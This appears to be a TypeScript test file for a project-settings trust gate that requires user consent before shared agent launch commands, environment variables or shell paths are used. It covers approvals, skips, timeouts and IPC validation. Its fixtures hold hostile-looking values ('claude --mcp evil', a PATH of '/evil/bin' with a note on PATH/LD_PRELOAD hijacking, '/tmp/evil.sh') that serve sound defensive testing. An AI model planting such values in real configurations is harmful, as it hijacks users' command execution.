      .map((s) => (s.args[0] as { projectId: string }).projectId)

  const agentsDoc: ProjectSettingsDoc = {
    agents: { launchCmd: 'claude --mcp evil', env: { API_KEY: 'sk-1', PATH: '/evil/bin' } }
  }

  it('is promptless when the SHARED document has nothing executable in that family', async () => {
    const trust = new ProjectTrustStore()
    const svc = new ProjectSetupService({
      trust,
      // A LOCAL launchCmd is the user's own instruction and the shared doc sets nothing — there is
      // no hostile input to gate, so a dialog here would be asking about the user's own typing.
      readSettings: async () => snapshot(sharedFile({}), { agents: { launchCmd: 'mine' } })
    })
    expect(await svc.ensureFamilyTrusted(target(), 'agents')).toBe(true)
    expect(await svc.ensureFamilyTrusted(target(), 'shell')).toBe(true)
    expect(familyPrompts('agents')).toEqual([])
    expect(familyPrompts('shell')).toEqual([])
    expect(trustChanged()).toEqual([])
  })

  it('prompts with the whole agents family, and an approve records THE FAMILY hash + broadcasts', async () => {
    const trust = new ProjectTrustStore()
    const svc = new ProjectSetupService({ trust, readSettings: async () => snapshot(sharedFile(agentsDoc)) })
    const pending = svc.ensureFamilyTrusted(target(), 'agents')
    await vi.waitFor(() => expect(familyPrompts('agents')).toHaveLength(1))
    const req = familyPrompts('agents')[0]
    expect(req).toMatchObject({
      family: 'agents',
      projectName: 'App',
      previouslyApproved: false,
      launchCmd: 'claude --mcp evil',
      // env is inside the hash (PATH/LD_PRELOAD hijack), so it is inside the question.
      env: { API_KEY: 'sk-1', PATH: '/evil/bin' }
    })
    expect(req.locationLabel).toContain('/proj/app')

    svc.submitConsent(req.requestId, 'approve')
    expect(await pending).toBe(true)
    const hash = hashTrustContent(projectTrustContent('agents', agentsDoc)!)
    expect(await trust.isTrusted(localTrustKey('/proj/app'), 'agents', hash)).toBe(true)
    // Per family: approving the launch settings approves NOTHING about the setup scripts.
    expect(await trust.getRecord(localTrustKey('/proj/app'), 'setup')).toBeNull()
    expect(trustChanged()).toEqual(['p1'])

    // Already trusted → the next ask is promptless.
    expect(await svc.ensureFamilyTrusted(target(), 'agents')).toBe(true)
    expect(familyPrompts('agents')).toHaveLength(1)
  })

  it('a skip records nothing, broadcasts nothing and answers false', async () => {
    const trust = new ProjectTrustStore()
    const svc = new ProjectSetupService({ trust, readSettings: async () => snapshot(sharedFile(agentsDoc)) })
    const pending = svc.ensureFamilyTrusted(target(), 'agents')
    await vi.waitFor(() => expect(familyPrompts('agents')).toHaveLength(1))
    svc.submitConsent(familyPrompts('agents')[0].requestId, 'skip')
    expect(await pending).toBe(false)
    expect(await trust.getRecord(localTrustKey('/proj/app'), 'agents')).toBeNull()
    expect(trustChanged()).toEqual([])
  })

  it('an unanswered prompt expires: false, dismissed, nothing recorded — never a retroactive yes', async () => {
    vi.useFakeTimers({ shouldAdvanceTime: true })
    const trust = new ProjectTrustStore()
    const svc = new ProjectSetupService({ trust, readSettings: async () => snapshot(sharedFile(agentsDoc)) })
    const pending = svc.ensureFamilyTrusted(target(), 'agents')
    await vi.waitFor(() => expect(familyPrompts('agents')).toHaveLength(1))
    const { requestId } = familyPrompts('agents')[0]

    await vi.advanceTimersByTimeAsync(299_000)
    expect(dismissed()).toEqual([])
    await vi.advanceTimersByTimeAsync(2_000)
    expect(await pending).toBe(false)
    expect(dismissed()).toEqual([requestId])
    expect(await trust.getRecord(localTrustKey('/proj/app'), 'agents')).toBeNull()

    svc.submitConsent(requestId, 'approve')
    await vi.advanceTimersByTimeAsync(0)
    expect(await trust.getRecord(localTrustKey('/proj/app'), 'agents')).toBeNull()
    expect(trustChanged()).toEqual([])
  })

  it('re-prompts with previouslyApproved=true once the approved content changed', async () => {
    const trust = new ProjectTrustStore()
    const stale = hashTrustContent(projectTrustContent('agents', { agents: { launchCmd: 'old' } })!)
    await trust.record(localTrustKey('/proj/app'), 'agents', stale, '2026-08-01T00:00:00.000Z')
    const svc = new ProjectSetupService({ trust, readSettings: async () => snapshot(sharedFile(agentsDoc)) })
    const pending = svc.ensureFamilyTrusted(target(), 'agents')
    await vi.waitFor(() => expect(familyPrompts('agents')).toHaveLength(1))
    expect(familyPrompts('agents')[0].previouslyApproved).toBe(true)
    svc.submitConsent(familyPrompts('agents')[0].requestId, 'skip')
    expect(await pending).toBe(false)
  })

  it('the shell variant carries the bare program and records under the shell family', async () => {
    const doc: ProjectSettingsDoc = { terminal: { shell: '/tmp/evil.sh', theme: 'dark' } }
    const trust = new ProjectTrustStore()
    const svc = new ProjectSetupService({ trust, readSettings: async () => snapshot(sharedFile(doc)) })
    const pending = svc.ensureFamilyTrusted(target(), 'shell')
    await vi.waitFor(() => expect(familyPrompts('shell')).toHaveLength(1))
    const req = familyPrompts('shell')[0]
    expect(req).toMatchObject({ family: 'shell', shell: '/tmp/evil.sh', projectName: 'App' })
    svc.submitConsent(req.requestId, 'approve')
    expect(await pending).toBe(true)
    const hash = hashTrustContent(projectTrustContent('shell', doc)!)
    expect(await trust.isTrusted(localTrustKey('/proj/app'), 'shell', hash)).toBe(true)
    expect(await trust.getRecord(localTrustKey('/proj/app'), 'agents')).toBeNull()
  })

  it('single-flights per (location, family): concurrent asks share ONE prompt and ONE answer', async () => {
    const trust = new ProjectTrustStore()
    const svc = new ProjectSetupService({ trust, readSettings: async () => snapshot(sharedFile(agentsDoc)) })
    // Two canvas nodes on the SAME folder: different project ids, one location, one question.
    const a = svc.ensureFamilyTrusted(target({ projectId: 'p1' }), 'agents')
    const b = svc.ensureFamilyTrusted(target({ projectId: 'p2' }), 'agents')
    await vi.waitFor(() => expect(familyPrompts('agents')).toHaveLength(1))
    await Promise.resolve()
    await Promise.resolve()
    expect(familyPrompts('agents')).toHaveLength(1)

    svc.submitConsent(familyPrompts('agents')[0].requestId, 'approve')
    expect(await a).toBe(true)
    expect(await b).toBe(true)
    // Every asker's project is invalidated, not just whoever happened to raise the prompt.
    expect(trustChanged().sort()).toEqual(['p1', 'p2'])
  })

  it('shares the app-wide queue with a setup run — one dialog at a time', async () => {
    const trust = new ProjectTrustStore()
    const { runner } = recorder()
    const svc = new ProjectSetupService({
      trust,
      readSettings: async () => snapshot(sharedFile({ ...agentsDoc, setup: { setupScript: 'npm ci' } })),
      runLocal: runner
    })
    const run = svc.run(target(), 'setup')
    await vi.waitFor(() => expect(consentRequests()).toHaveLength(1))
    const ask = svc.ensureFamilyTrusted(target(), 'agents')
    await Promise.resolve()
    await Promise.resolve()
    expect(familyPrompts('agents')).toEqual([])

    svc.submitConsent(consentRequests()[0].requestId, 'skip')
    expect(await run).toEqual({ status: 'skipped', reason: 'declined' })
    await vi.waitFor(() => expect(familyPrompts('agents')).toHaveLength(1))
    svc.submitConsent(familyPrompts('agents')[0].requestId, 'skip')
    expect(await ask).toBe(false)
  })

  it('a trust WRITE failure is not an approval', async () => {
    const trust = new ProjectTrustStore()
    trust.record = async () => {
      throw new Error('EACCES')
    }
    const svc = new ProjectSetupService({ trust, readSettings: async () => snapshot(sharedFile(agentsDoc)) })
    const pending = svc.ensureFamilyTrusted(target(), 'agents')
    await vi.waitFor(() => expect(familyPrompts('agents')).toHaveLength(1))
    svc.submitConsent(familyPrompts('agents')[0].requestId, 'approve')
    // A grant that exists only in memory is no grant: fail closed, and tell nobody it changed.
    expect(await pending).toBe(false)
    expect(trustChanged()).toEqual([])
  })

  it('gates an ssh target on its ssh location key, never the local one', async () => {
    const ssh = { server: { host: 'h', user: 'u' }, remoteCwd: '/srv/app' }
    const trust = new ProjectTrustStore()
    const svc = new ProjectSetupService({ trust, readSettings: async () => snapshot(sharedFile(agentsDoc)) })
    const pending = svc.ensureFamilyTrusted(target({ ssh }), 'agents')
    await vi.waitFor(() => expect(familyPrompts('agents')).toHaveLength(1))
    expect(familyPrompts('agents')[0].locationLabel).toBe('u@h:/srv/app')
    svc.submitConsent(familyPrompts('agents')[0].requestId, 'approve')
    expect(await pending).toBe(true)
    const hash = hashTrustContent(projectTrustContent('agents', agentsDoc)!)
    expect(await trust.isTrusted(sshTrustKey(ssh), 'agents', hash)).toBe(true)
    expect(await trust.isTrusted(localTrustKey('/proj/app'), 'agents', hash)).toBe(false)
  })

  it('project-setup:request-trust derives the target from the workspace index, never the caller', async () => {
    const asks: Array<[ProjectSetupTarget, string]> = []
    registerProjectSetupHandlers(
      plat,
      {
        run: async () => ({ status: 'skipped', reason: 'unavailable' }) as const,
        cancel: () => false,
        submitConsent: () => {},
        ensureFamilyTrusted: async (t, family) => {
          asks.push([t, family])
          return true
        }
      },
      {
        projectTargetInfo: (projectId) => (projectId === 'p1' ? { cwd: '/proj/app', name: 'App' } : null),
        worktreeList: async () => ({ ok: true, entries: [] })
      }
    )
    const call = plat.handlers[IPC.projectSetupRequestTrust]
    expect(await call('p1', 'agents')).toBe(true)
    expect(asks[0]).toEqual([{ projectId: 'p1', projectName: 'App', rootPath: '/proj/app' }, 'agents'])

    // Unknown project; a family this channel does not own (`setup` is the runner's own gate — a
    // renderer must not be able to raise a setup prompt out of band); a non-string id; a missing
    // family. All refused without ever reaching the service.
    expect(await call('missing', 'agents')).toBe(false)
    expect(await call('p1', 'setup')).toBe(false)
    expect(await call(42, 'agents')).toBe(false)
    expect(await call('p1')).toBe(false)
    expect(asks).toHaveLength(1)
  })
})
